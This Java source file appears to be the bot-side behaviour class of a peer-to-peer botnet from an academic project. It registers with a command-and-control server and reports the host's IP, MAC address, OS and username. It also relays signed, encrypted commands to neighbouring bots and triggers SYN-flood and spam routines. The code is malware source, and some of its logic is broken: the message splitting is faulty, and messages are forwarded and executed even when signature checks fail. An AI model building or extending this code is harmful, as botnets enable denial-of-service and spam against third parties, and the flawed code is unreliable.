package cs.sii.bot.action;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SignatureException;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service
public class Behavior {

	@Autowired
	private NetworkService nServ;

	@Autowired
	private BotRequest req;

	@Autowired
	private Auth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private Malicious malS;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private RoleServiceImpl rServ;

	@Autowired
	private UserServiceImpl uServ;

	// Il secondo valore è vuoto però ci serviva una lista sincata per non
	// implementarla di nuovo
	@Autowired
	private SyncIpList<Integer, String> msgHashList;

	/**
	 * just needed for initialize beans
	 * 
	 */
	public Behavior() {
	}

	/**
	 * 
	 */
	public void initializeBot() {

		nServ.firstConnectToMockServerDns();
		/*
		 * if (challengeToCommandConquer()) {
		 * System.out.println("Bot is Ready"); } else
		 * System.out.println("Bot not Ready, authentication failed");
		 */
		String data = nServ.getIdHash();

		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
		List<Pairs<String, String>> response = null;
		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
		if (response != null) {
			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
		} else
			System.out.println("torno null");

	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 */
	private boolean challengeToCommandConquer() {
		System.out.println("IP C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
				nServ.getCommandConquerIps().getList().get(0).getValue1());
		if (challenge != null) {
			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);
			String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(),
					nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
					nServ.getCommandConquerIps().getList().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
					nServ.isElegible());
			System.out.println("La risposta del CeC: " + response);
		}
		return true;
	}

	// verify bot

	// verify msgbyCec

	// asynch thread
	// decript msg

	// send to neighbourhood

	// execute

	// answer yes

	// else answer no

	// /**
	// * Convert a String with format red|green|blue|alpha
	// * to a Color object
	// */
	// @Override
	// public Color convertToEntityAttribute(String colorString) {
	// String[] rgb = colorString.split(SEPARATOR);
	// return new Color(Integer.parseInt(rgb[0]),
	// Integer.parseInt(rgb[1]),
	// Integer.parseInt(rgb[2]),
	// Integer.parseInt(rgb[3]));
	// }

	// IDMSG|COMANDO|SIGNATURE

	/**
	 * @param rawData
	 */
	@Async
	public void floodAndExecute(String rawData) {

		String msg = "";

		// decritta il msg
		try {
			msg = pki.getCrypto().decryptAES(rawData);
		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException
				| UnsupportedEncodingException e) {
			System.out.println("error decrypting message");
			e.printStackTrace();
			return;
		}
		// hai gia ricevuto questo msg?

		// Per comodità
		String[] msgs = msg.split("|");

		if (msgHashList.indexOfValue2(msgs[0]) < 0) {

			// verifica la firma con chiave publica c&c
			try {
				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
					Pairs<Integer, String> data = new Pairs<>();
					data.setValue1(msgHashList.getSize() + 1);
					data.setValue2(msgs[0]);
					msgHashList.add(data);
				}
			} catch (InvalidKeyException | SignatureException e) {
				System.out.println("Errore nel controllo firma durante il flooding " + msgs[2]);
				e.printStackTrace();
			}
			// se verificato inoltralo ai vicini
			floodNeighoours(msg);
			// inoltra all'interpretedei msg
			executeCommand(msg);
		}

	}

	@Async
	private void floodNeighoours(String msg) {
		nServ.getNeighbours().getList().forEach((pairs) -> {
			req.sendFloodToOtherBot(pairs.getValue1().toString(), msg);
		});

		// cripta il messaggio e invialo ai vicini

	}

	// TODO definire attacchi
	@Async
	private void executeCommand(String msg) {
		switch (msg) {
		case "synflood":
			malS.synFlood(msg);
			break;
		case "spam":
			malS.spam(msg);
			break;
		case "search file":

			break;
		}

		// che comando è?
		// spam
		// attack
		// search file
		// Mail
		// Update vicinato
		//

	}

	public BotRequest getRequest() {
		return req;
	}

	public void setRequest(BotRequest request) {
		this.req = request;
	}

	
//	class RolesComp implements Comparator<Role>{
//		
//		@Override
//		public int compare(Role a, Role b ){
//			if(a.getId()>b.getId())
//			return 1
//		}
//	}
	
	/**
	 * @param ip
	 */
	@Async
	public void getPower(String ip) {
		// richiesta ruoli
		List<Role> roles = req.getRoles(ip);
		Collections.sort(roles, (a,b)-> a.getId()<b.getId() ? -1 : a.getId()==b.getId() ? 0 : 1);
		roles.forEach(role -> System.out.println("ruolo: " + role));
		rServ.saveAll(roles);

		// richiesta bots
		List<Bot> bots = req.getBots(ip);
		bots.forEach(bot -> System.out.println("bots: " + bot));
		bServ.saveAll(bots);
		
		
		// richiesta users
		List<User> users = req.getUser(ip);
		users.forEach(user -> System.out.println("users: " + user));
		uServ.saveAll(users);
		
		// prendo grafo
		List<String> graph = req.getPeers(ip);

		graph.forEach(e -> System.out.println("edges: " + e));
		// informo cc vecchio che spnp ready
		//

	}
}

// TODO Trasformare tutto quello qui sotto da controller alla funzione chiamata
// sopra
// l idea è quella di mettere un solo controller che intercetta messagi e
// successivamente passarli ad un thread
// il thread decodifica il msg e se viene verificata la signature lo inoltra ai
// vicini -sender
// il messaggio viene inoltrato ad un nuovo thread che lo interpreta e fara
// eseguire la funzione opportuna.
// TODO inserire controller dove arriva la lista dei vicini il bot verifica il
// msg se appartiene alla chiave del cec aggiorna il suo vicinato

/**
 * 
 * @RequestMapping("/SetDelay") public Boolean SetDelay(int delay) {
 * engineBot.setPingdelay(delay); return true; }
 * 
 * @RequestMapping("/GetDelay") public Integer getDelay() { return
 * engineBot.getPingdelay(); }
 * 
 * 
 * 
 * @RequestMapping("/SleepTime") public Boolean SleepMode(int timeToSleep) {
 * engineBot.setSleeptime(timeToSleep); return true; }
 * 
 * @RequestMapping("/BecomeCeC") public String bringCommand() {
 * 
 * //TODO richiedi dati db
 * 
 * 
 * 
 * engineBot.setCommandandconquerStatus(true); return "Ready"; }
 * 
 * 
 * 
 */

//// TEST PER METTERE LA CHIAVE NEL DB E ESSERE SICURI CHE VENGA MEMORIZZATA E
//// RILETTA BENE

// System.out.println("AAAAAAAAAAAA" + pki.getPubRSAKey().getEncoded().length +
// " lll "
// + pki.getPubRSAKey().getEncoded().toString());
//
// Bot botTest = new Bot(nServ.getIdHash(), nServ.getIp().toString(),
// nServ.getMac(), nServ.getOs(),
// nServ.getVersionOS(), nServ.getArchOS(), "kkk", pki.getPubRSAKey());
//
// botService.save(botTest);
//
// List<Bot> bots = botService.searhBotfindBypubKey(pki.getPubRSAKey());
// if (bots != null)
// for (Bot bot : bots) {
// System.out.println("zzz" + bot.getPkey());
// }
//
// try {
// System.out.println("kkkkK " +
// pki.decryptMessageRSA(pki.encryptMessageRSA("123lalala!!",
// pki.rebuildPuK(bots.get(0).getPkey()))));
// } catch (InvalidKeyException | IllegalBlockSizeException |
// BadPaddingException | UnsupportedEncodingException
// | NoSuchAlgorithmException | InvalidKeySpecException e) {
// e.printStackTrace();
// }
// //
// //